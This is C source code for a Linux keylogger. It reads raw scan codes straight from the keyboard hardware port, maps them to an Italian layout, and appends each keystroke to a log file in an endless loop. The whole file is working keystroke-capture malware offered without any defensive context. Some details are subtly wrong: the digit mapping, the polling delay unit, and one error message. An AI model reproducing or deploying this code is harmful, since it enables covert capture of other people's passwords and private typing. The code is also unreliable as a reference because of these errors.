#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/io.h>
 
#define KB_IO   0x60
#define KB_STATUS       0x64
#define SLEEP_T 50 // how often (ms) the program reads from the keyboard port
 
const char get_key(int code)  {
        if ((code>=2) && (code<=10))
                return (char) code+29;
 
        switch (code)  {
                case(11):        return '0'; break;
                case(12):        return '\'';break;
                case(13):        return 'ì'; break;
                case(14):        return '\b';break;
                case(15):        return '\t';break;
                case(16):        return 'q'; break;
                case(17):        return 'w'; break;
                case(18):        return 'e'; break;
                case(19):        return 'r'; break;
                case(20):        return 't'; break;
                case(21):        return 'y'; break;
                case(22):        return 'u'; break;
                case(23):        return 'i'; break;
                case(24):        return 'o'; break;
                case(25):        return 'p'; break;
                case(26):        return 'è'; break;
                case(27):        return '+'; break;
                case(28):        return '\n';break;
                case(30):        return 'a'; break;
                case(31):        return 's'; break;
                case(32):        return 'd'; break;
                case(33):        return 'f'; break;
                case(34):        return 'g'; break;
                case(35):        return 'h'; break;
                case(36):        return 'j'; break;
                case(37):        return 'k'; break;
                case(38):        return 'l'; break;
                case(39):        return 'ò'; break;
                case(40):        return 'à'; break;
                case(42):        return '<'; break;
                case(43):        return 'ù'; break;
                case(44):        return 'z'; break;
                case(45):        return 'x'; break;
                case(46):        return 'c'; break;
                case(47):        return 'v'; break;
                case(48):        return 'b'; break;
                case(49):        return 'n'; break;
                case(50):        return 'm'; break;
                case(51):        return ','; break;
                case(52):        return '.'; break;
                case(53):        return '-'; break;
                case(57):        return ' '; break;
        }
 
        return 0;
}
 
int main (int argc, char **argv)  {
        int lastcode=0,code=0;
        FILE *fp;
 
        if (argc!=2)  {
                printf ("%s <logfile>\n",argv[0]);
                return 1;
        }
 
        if (!(fp=fopen(argv[1],"a")))  {
                printf ("Unable to write on %s\n",argv[0]);
                return 2;
        }
 
        if (ioperm(KB_IO,1,1)==-1 || ioperm(KB_STATUS,1,1)==-1)  {
                printf ("Unable to access to I/O keyboard port\n");
                return 3;
        }
 
        while(1)  {
                code=0;
 		
		//read a byte from the keyboard port
                if (inb(KB_STATUS)==20)
                        code=inb(KB_IO);
 
                if (code)  {
                        if (code!=lastcode)  {
                                lastcode=code;
 
                                if (get_key(code))  {
                                        fprintf (fp,"%c",get_key(code));
                                        fflush (fp);
                                }
                        }
                }
 
                usleep(SLEEP_T);
        }
}
